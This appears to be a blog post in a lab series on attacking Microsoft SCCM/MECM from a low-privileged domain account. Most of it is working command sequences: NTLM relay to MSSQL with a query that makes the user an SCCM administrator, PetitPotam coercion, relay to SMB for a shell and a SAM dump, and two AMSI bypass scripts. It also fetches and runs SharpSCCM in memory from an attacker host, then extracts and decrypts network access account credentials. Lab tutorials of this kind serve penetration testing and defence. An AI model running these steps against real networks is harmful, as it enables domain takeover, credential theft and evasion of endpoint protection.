---
layout: post
title:  "SCCM / MECM LAB - Part 0x2 - Low user"
category : [AD, SCCM]
tags :  AD, SCCM
---

On the previous post ([SCCM LAB part 0x1]({% link _posts/2024-03-28-SCCM-LAB-part0x1.md %})) we started the recon and exploit the PXE feature.
On this part we will start SCCM exploitation with low user credentials.

# Takeover 1 - relay to mssql (low user -> mssql server admin)

- A super cool technic by default on mecm when the database is separate of the site server is that the server site is necessary sysadmin of the database. We can use it to relay the MECM$ computer to the MSSQL server database.
- Details : [Takeover-1](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md)

- [sccmhunter](https://github.com/garrettfoster13/sccmhunter) will do the coffee for that by giving us the query we need to relay !

```bash
python3 sccmhunter.py mssql -u carol -p SCCMftw -d sccm.lab -dc-ip 192.168.33.10 -debug -tu carol -sc P01 -stacked
```
![sccm_hunter_relay_mssql.png](/assets/blog/SCCM/sccm_hunter_relay_mssql.png)

- Prepare the relay with the mssql query from the previous command

```bash
ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 -q "USE CM_P01; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x010500000000000515000000680D6A08DCF1872FCE3F29425A040000,'SCCMLAB\carol',0,0,'','','','','P01');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00004','1');"
```

- Launch petitpotam (or another coerce) :

```bash
petitpotam.py -d sccm.lab -u carol -p SCCMftw 192.168.33.1 192.168.33.11
```

![sccm_hunter_relay_mssql_petipotam.png](/assets/blog/SCCM/sccm_hunter_relay_mssql_petipotam.png)

- And our low user become MECM admin \o/

![sccm_hunter_relay_mssql2.png](/assets/blog/SCCM/sccm_hunter_relay_mssql2.png)

- As a proof let's connect as admin with sccmhunter

```bash
python3 sccmhunter.py admin -u carol@sccm.lab -p 'SCCMftw' -ip 192.168.33.11 

() C:\ >> show_admins
```

![sccm_hunter_relay_mssql_new_admin.png](/assets/blog/SCCM/sccm_hunter_relay_mssql_new_admin.png)


# Takeover-2 - Relay to SMB on remote DB (low user -> mecm admin account)

- Microsoft impose the computer account of the site server to be admin on the mssql server
- By knowing that you can simply coerce MECM to MSSQL computer and get the hashes
- Details : [Takeover-2](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-2/takeover-2_description.md)


- prepare the relay to the mssql server

```bash
ntlmrelayx -t 192.168.33.12 -smb2support -socks
```

- launch the coerce with petitpotam

```bash
petitpotam.py -d sccm.lab -u sccm-naa -p 123456789 192.168.33.1 192.168.33.11
```

![sccm_relay_to_mssql_smb.png](/assets/blog/SCCM/sccm_relay_to_mssql_smb.png)

- Get a shell
```bash
proxychains -q smbexec.py -no-pass SCCMLAB/'MECM$'@192.168.33.12
```

![elevate1_smbexec.png](/assets/blog/SCCM/elevate1_smbexec.png)

- Get the sam
```bash
proxychains -q secretsdump.py -no-pass SCCMLAB/'MECM$'@192.168.33.12
```

![elevate1_sam.png](/assets/blog/SCCM/elevate1_sam.png)


# Elevate-2 - Relay Client Push Installation (low user -> client push account)

- Client push if fallback to ntlm is enabled
- Details : [Elevate-2](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-2/takeover-2_description.md)
- As we can't do that from linux we will use [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) to do that.
- Let's connect with a low user like `sccm.lab\franck:rockme` to CLIENT$
- Compile and put SharpSCCM_merged.exe into a folder on your attack machine (servir it with `python3 -m http.server 8888`)
- Launch a responder in you attack vm (`Responder.py -I vmnet6`)

- On CLIENT$ do AMSI bypass on powershell level

```powershell
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
```

- Next run the rastamouse's AMSI bypass to disable AMSI for csharp too

```powershell
# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

- And then launch SharpSCCM in memory

```powershell
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.33.1:8888/SharpSCCM_merged.exe');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
[SharpSCCM.Program]::Main("invoke client-push -mp mecm.sccm.lab -sc P01 -t 192.168.33.1".split());
```

![sccm_client_push.png](/assets/blog/SCCM/sccm_client_push.png)

- A few moment later on responder, the client-push account (local admin of sccm client !) and the MECM$ computer account (admin of at least the mssql server)

![sccm_client_push_responder.png](/assets/blog/SCCM/sccm_client_push_responder.png)

- Now we have confirmation of the account involve let's relay to mssql server
- Prepare the relay :

```bash
ntlmrelayx.py -t 192.168.33.12  -smb2support -socks
```

- relaunch the client push
```powershell
[SharpSCCM.Program]::Main("invoke client-push -mp mecm.sccm.lab -sc P01 -t 192.168.33.1".split());
```

- And get a shell with the relay

```bash
proxychains -q smbexec.py -no-pass SCCM.LAB/SCCM-CLIENT-PUSH@192.168.33.12
```
![sccm_client_push_relay_smb.png](/assets/blog/SCCM/sccm_client_push_relay_smb.png)


> Warning this will create an entry into the mecm device (you will have to delete it once sccmadmin or ask your client to do that)
> ![unexpected_devices.png](/assets/blog/SCCM/unexpected_devices.png)
{: .prompt-warning }

# Cred-2 - Policy Request Credentials - Computer account get secrets of NAA (computer acount -> naa account)

- Add a computer:

```bash
addcomputer.py -computer-name 'exegol$' -computer-pass 'maytheforcebewithyou' 'sccm.lab/carol:SCCMftw' -dc-ip 192.168.33.10
```

![sccm_add_computer.png](/assets/blog/SCCM/sccm_add_computer.png)

## from linux
- details [here](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)

- Add this line in your `/etc/hosts`

```
192.168.33.11 MECM MECM.SCCM.LAB
```

- From linux use SCCMWTF

```bash
python3 sccmwtf.py fake fakepc.sccm.lab MECM 'SCCMLAB\exegol$' 'maytheforcebewithyou'
```

![sccm_wtf.png](/assets/blog/SCCM/sccm_wtf.png)

- Creds are in naapolicy.xml

![naapolicy.xml.png](/assets/blog/SCCM/naapolicy.xml.png)

- And xpn also write the python script to decipher the result <3

```bash
cat /tmp/naapolicy.xml |grep 'NetworkAccessUsername\|NetworkAccessPassword' -A 5 |grep -e 'CDATA' | cut -d '[' -f 3|cut -d ']' -f 1| xargs -I {} python3 policysecretunobfuscate.py {}
```

![sccmwtf_decipher.png](/assets/blog/SCCM/sccmwtf_decipher.png)

> Warning this one also will create an entry into the mecm device (you will have to delete it once sccmadmin or ask your client to do that)
> ![dirtu_sccmwtf.png](/assets/blog/SCCM/dirtu_sccmwtf.png)
{: .prompt-warning }


## from windows

- Details [here](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-2/cred-2_description.md)
- From windows launch the get secrets command

```bash
[SharpSCCM.Program]::Main("get secrets -r newcomputer -u exegol$ -p maytheforcebewithyou".split());
```

![sharpsccm_getnaa.png](/assets/blog/SCCM/sharpsccm_getnaa.png)

> Careful this one also create artifact in the client console
> ![dirty_naa_retreive.png](/assets/blog/SCCM/dirty_naa_retreive.png)
{: .prompt-warning }

